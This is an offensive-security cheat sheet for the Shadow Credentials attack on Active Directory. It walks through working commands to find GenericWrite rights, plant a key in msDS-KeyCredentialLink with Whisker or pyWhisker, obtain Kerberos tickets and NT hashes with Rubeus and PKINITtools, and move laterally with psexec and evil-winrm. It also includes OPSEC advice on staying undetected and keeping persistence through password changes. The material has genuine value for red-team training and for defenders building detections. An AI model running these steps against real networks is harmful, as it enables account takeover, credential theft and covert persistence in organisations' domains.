# Shadow Credentials — msDS-KeyCredentialLink Abuse

**What:** The `msDS-KeyCredentialLink` attribute stores public key credentials for passwordless PKINIT authentication (Windows Hello for Business). If you have **GenericWrite** or **GenericAll** over a user or computer object, you can add your own public key to this attribute — giving you a way to authenticate as that object using a certificate, without knowing or changing their password.

**Why it's valuable:**
- Persistence that survives password changes
- No modification of the target's password (lower detection)
- Works against users and computer accounts
- Chain: GenericWrite → shadow credential → TGT → NT hash via PKINIT

---

## Prerequisites

- **GenericWrite / GenericAll** on the target user or computer object
- Domain must have at least one Windows Server 2016+ DC (PKINIT requires this)
- Does NOT work on Read-Only Domain Controllers (RODCs)

---

## Step 1: Enumerate GenericWrite Targets

```powershell
# PowerView — find objects you have write access over:
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty"} | Where-Object {$_.IdentityReference -match "YourUser|YourGroup"}

# BloodHound: "Find Principals with DCSync Rights" and "Shortest Paths to Domain Admin"
# Look for: GenericWrite → User and GenericWrite → Computer edges

# Check if PKINIT is available (DC must be 2016+):
Get-ADDomainController | Select Name, OperatingSystem
```

---

## Step 2: Add Shadow Credential with Whisker (Windows)

**Whisker** is a C# tool that adds a public key to the target's `msDS-KeyCredentialLink` attribute.

```powershell
# Add shadow credential to target user:
.\Whisker.exe add /target:targetuser

# Output includes:
#   DeviceID: <GUID>
#   A certificate has been generated for authentication purposes.
#   Invoke Rubeus with: ./Rubeus.exe asktgt /user:targetuser /certificate:<base64> /password:"<password>" /nowrap /domain:corp.com /dc:<DC>

# Add to a computer account (e.g., for machine account compromise):
.\Whisker.exe add /target:TARGET_COMPUTER$

# List existing shadow credentials on a target:
.\Whisker.exe list /target:targetuser

# Remove a shadow credential (cleanup — use the DeviceID from above):
.\Whisker.exe remove /target:targetuser /deviceid:<GUID>
```

---

## Step 3: Add Shadow Credential with pyWhisker (Kali)

```bash
# Install:
pip3 install pywhisker
# OR: git clone https://github.com/ShutdownRepo/pywhisker

# Add shadow credential using NTLM hash:
python3 pywhisker.py -d corp.com -u attacker -H :NTHASH --target targetuser --action add

# Add using password:
python3 pywhisker.py -d corp.com -u attacker -p 'Password123' --target targetuser --action add

# Output: Certificate written to <filename>.pfx, password stored in <filename>.pass

# List shadow credentials:
python3 pywhisker.py -d corp.com -u attacker -H :NTHASH --target targetuser --action list

# Remove by DeviceID:
python3 pywhisker.py -d corp.com -u attacker -H :NTHASH --target targetuser --action remove --device-id <GUID>
```

---

## Step 4: Get TGT Using the Shadow Credential (Rubeus)

```powershell
# Windows — use the certificate output from Whisker:
.\Rubeus.exe asktgt /user:targetuser /certificate:<base64_cert> /password:"<cert_password>" /domain:corp.com /dc:dc01.corp.com /ptt /nowrap

# Verify:
klist
dir \\dc01\c$   # if targetuser is DA
```

---

## Step 5: Get TGT Using the Shadow Credential (impacket — Kali)

```bash
# Using the .pfx file from pyWhisker:
# First convert .pfx to PEM pair (impacket needs PEM):
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes -passin pass:<cert_password>
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem -passin pass:<cert_password>

# OR use gettgtpkinit.py from PKINITtools:
python3 gettgtpkinit.py corp.com/targetuser -cert-pfx cert.pfx -pfx-pass <password> targetuser.ccache

export KRB5CCNAME=targetuser.ccache
klist

# Get NT hash from the TGT (U2U + PKINIT — no cracking needed):
python3 getnthash.py corp.com/targetuser -key <session_key_from_previous_output>
# This gives you the user's actual NT hash without knowing the password
```

---

## Step 6: Lateral Movement

```powershell
# Windows — once TGT is injected:
dir \\target\c$
Enter-PSSession -ComputerName target
.\PSExec.exe \\target cmd

# From Kali (after getting NT hash from step 5):
evil-winrm -i target.corp.com -u targetuser -H NTHASH
impacket-psexec corp.com/targetuser@target.corp.com -hashes :NTHASH
```

---

## Computer Account Shadow Credentials (Machine Account Compromise)

Same flow but against computer accounts. Useful when you have GenericWrite on a computer object:

```powershell
# Add shadow credential to computer account:
.\Whisker.exe add /target:COMPUTER$

# Get TGT as COMPUTER$:
.\Rubeus.exe asktgt /user:COMPUTER$ /certificate:<base64> /password:<password> /domain:corp.com /ptt

# Once you have the machine account TGT:
# → If machine has admin rights → secretsdump locally
# → If RBCD configured → further S4U2Self abuse
```

---

## Quick Reference

| Step | Windows Tool | Kali Tool |
|------|-------------|-----------|
| Add shadow cred | Whisker.exe | pywhisker.py |
| Get TGT | Rubeus asktgt /certificate | gettgtpkinit.py |
| Get NT hash | Rubeus /getcredentials | getnthash.py |
| List shadow creds | Whisker.exe list | pywhisker.py --action list |
| Remove shadow cred | Whisker.exe remove | pywhisker.py --action remove |

---

## Why This is Better Than Kerberoasting

- **No password cracking** — the shadow credential gives you a TGT directly
- **Target doesn't need a weak password** — works on any account you have GenericWrite over
- **Durable** — survives password changes (until the shadow credential is removed)
- **Low detection** — modifying msDS-KeyCredentialLink doesn't trigger common alerts

## OPSEC Notes

- **Check existing shadow credentials** first (Whisker list) — adding a second one is noisier
- **DeviceID is logged** — if incident response checks msDS-KeyCredentialLink, they'll see your addition
- **Cleanup**: Always remove with `Whisker.exe remove /deviceid:<GUID>` after exploitation
